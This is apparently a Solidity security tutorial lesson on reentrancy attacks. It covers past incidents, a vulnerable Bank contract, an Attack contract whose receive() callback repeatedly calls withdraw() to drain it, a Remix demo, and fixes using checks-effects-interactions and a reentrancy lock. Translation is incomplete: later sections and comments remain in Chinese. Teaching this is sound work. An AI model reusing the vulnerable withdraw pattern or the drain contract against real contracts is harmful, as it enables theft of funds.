---
title: S01. reentrancy attack
tags:
  - solidity
  - security
  - fallback
  - modifier
---

# WTF Solidity contract security:  S01. reentrancy attacks

I recently started learning solidity again, consolidating some details, and wrote a “WTF Solidity Simplified Introduction” for beginners (programming experts can find other tutorials), updating 1-3 lectures every week.

Twitter：[@0xAA_Science](https://twitter.com/0xAA_Science)

community：[Discord](https://discord.gg/5akcruXrsk)｜[WeChat group](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[official website WTF Academy](https://wtf.academy)

All code and tutorials are open source on GitHub : [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

-----

In this lecture, we will introduce the most common type of smart contract attack - reentrancy attack, which once caused Ethereum to fork into ETH and ETC (Ethereum Classic), and explain how to avoid it.

##  reentrancy attacks 

 Reentrancy attack is the most common type of attack on smart contracts, where attackers exploit contract vulnerabilities (such as fallback functions) to repeatedly call contracts, transfer assets out of contracts or mint a large number of tokens.
 
some notable reentrancy attacks: 

-  In 2016, The DAO contract was attacked by reentrancy, hackers stole 3,600,000 ETH from the contract, and caused Ethereum to fork into `ETH `chain and `ETC` (Ethereum Classic) chain.
- In 2019, synthetic asset platform Synthetix suffered a reentrancy attack and was stolen 3,700,000 `sETH`.
- In 2020, lending platform Lendf.me suffered a reentrancy attack and was stolen $25,000,000.
- In 2021, lending platform CREAM FINANCE suffered a reentrancy attack and was stolen $18,800,000.
- In 2022, algorithmic stablecoin project Fei suffered a reentrancy attack and was stolen $80,000,000.

It has been six years since The DAO was attacked by reentrancy, but every year there are still a few projects that lose tens of millions of dollars due to reentrancy vulnerabilities, so understanding this vulnerability is very important.

## `0xAA` The story of robbing a bank

In order to help everyone understand better, here is a story about ‘Hacker 0xAA robbing a bank’ for everyone.

The tellers at the Ethereum bank are all robots (Robot), controlled by smart contracts. When a normal user (User) comes to the bank to withdraw money, its service process is:

1. Check the user’s `ETH` balance. If it is greater than `0`, proceed to the next step. 
2. Transfer the user’s `ETH` balance from the bank to the user and ask if the user has received it. 
3. Update the balance under the user’s name to `0`.

One day, hacker 0xAA came to the bank. This is his conversation with the robot teller:
- 0xAA: I want to withdraw money, `1 ETH`.
- Robot:Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`。
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`.
- Robot: Checking your balance: `1 ETH`. Transferring `1 ETH` to your account. Have you received the money?
- 0xAA : Wait, I want to withdraw money, `1 ETH`.
- ...

In the end, `0xAA` exploited a vulnerability in the re-entry attack and emptied the bank’s assets. The bank died.

![](./img/S01-1.png)

## Example of a vulnerable contract

### Bank contract

The bank contract is very simple. It contains `1` state variable `balanceOf` that records the Ethereum balance of all users. It contains `3 `functions:
- `deposit()`：Deposit function, deposit `ETH` into the bank contract and update the user’s balance.
- `withdraw()`：Withdrawal function, transfer the caller’s balance to them. The specific steps are the same as in the story above: check balance, transfer, update balance.**Note: This function has a re-entry vulnerability.！**
- `getBalance()`：Get the `ETH` balance in the bank contract

```solidity
contract Bank {
    mapping (address => uint256) public balanceOf;    // balance mapping

    // Deposit ether and update the balance.
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Withdraw all ether from msg.sender.
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // get balance
        require(balance > 0, "Insufficient balance");
        //  translates to “Transfer ether!!! May activate the fallback/receive function of a malicious contract, with the risk of re-entry!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // update balance
        balanceOf[msg.sender] = 0;
    }

    //get the balance of the bank contract
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### attack contract

translates to “One attack point of a re-entry attack is the place where the contract transfers `ETH`: if the target address of the `ETH` transfer is a contract, it will trigger the `fallback` (fallback) function of the other party’s contract, thus causing the possibility of circular calls. If you don’t understand fallback functions, you can read [WTF Solidity Minimalist Tutorial Lecture 19: Receiving ETH](https://github.com/AmazingAng/WTFSolidity/blob/main/19_Fallback/readme.md)。`Bank`The contract has `ETH` transfer in the `withdraw()` function：

```
(bool success, ) = msg.sender.call{value: balance}("");
```

If a hacker re-calls the `withdraw()` function of the Bank contract in the `fallback()` or `receive()` function of the attack contract, it will cause a circular call in the` 0xAA` bank robbery story, constantly allowing the `Bank` contract to transfer money to the attacker, and finally emptying the contract’s `ETH`.

```solidity
    receive() external payable {
        bank.withdraw();
    }
```

Next, let’s take a look at the attack contract. Its logic is very simple. It uses the `receive()` fallback function to cyclically call the `withdraw()` function of the Bank contract. It has `1` state variable `bank` for recording the address of the `Bank` contract. It contains `4` functions:

- Constructor: Initialize the Bank contract address.
- `receive()`: Callback function, triggered when receiving `ETH`, and calls the `withdraw()` function of the` Bank` contract again to withdraw money cyclically.
- `attack()`：Attack function, first deposit money with the `deposit()` function of the Bank contract, then call `withdraw()` to initiate the first withdrawal. After that, the `withdraw()` function of the Bank contract and the `receive()` function of the attack contract will be called cyclically to empty the ETH of the Bank contract .
- `getBalance()`：Get the `ETH` balance in the attack contract。

```solidity
contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## `Remix`演示

1. 部署`Bank`合约，调用`deposit()`函数，转入`20 ETH`。
2. 切换到攻击者钱包，部署`Attack`合约。
3. 调用`Atack`合约的`attack()`函数发动攻击，调用时需转账`1 ETH`。
4. 调用`Bank`合约的`getBalance()`函数，发现余额已被提空。
5. 调用`Attack`合约的`getBalance()`函数，可以看到余额变为`21 ETH`，重入攻击成功。

## 预防办法

目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。

### 检查-影响-交互模式

检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将`Bank`合约`withdraw()`函数中的更新余额提前到转账`ETH`之前，就可以修复漏洞：

```solidity 
function withdraw() external {
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");
    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
    balanceOf[msg.sender] = 0;
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");
}
```

### 重入锁

重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为`0`的状态变量`_status`。被`nonReentrant`重入锁修饰的函数，在第一次调用时会检查`_status`是否为`0`，紧接着将`_status`的值改为`1`，调用结束后才会再改为`0`。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读[WTF Solidity极简教程第11讲：修饰器](https://github.com/AmazingAng/WTFSolidity/blob/main/13_Modifier/readme.md)。

```solidity
uint256 private _status; // 重入锁

// 重入锁
modifier nonReentrant() {
    // 在第一次调用 nonReentrant 时，_status 将是 0
    require(_status == 0, "ReentrancyGuard: reentrant call");
    // 在此之后对 nonReentrant 的任何调用都将失败
    _status = 1;
    _;
    // 调用结束，将 _status 恢复为0
    _status = 0;
}
```

只需要用`nonReentrant`重入锁修饰`withdraw()`函数，就可以预防重入攻击了。

```solidity
// 用重入锁保护有漏洞的函数
function withdraw() external nonReentrant{
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");

    balanceOf[msg.sender] = 0;
}
```

## 总结

这一讲，我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个`0xAA`抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行`ETH`转账时进行重入攻击。实际业务中，`ERC721`和`ERC1155`的`safeTransfer()`和`safeTransferFrom()`安全转账函数，还有`ERC777`的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的`external`函数，虽然可能会消耗更多的`gas`，但是可以预防更大的损失。
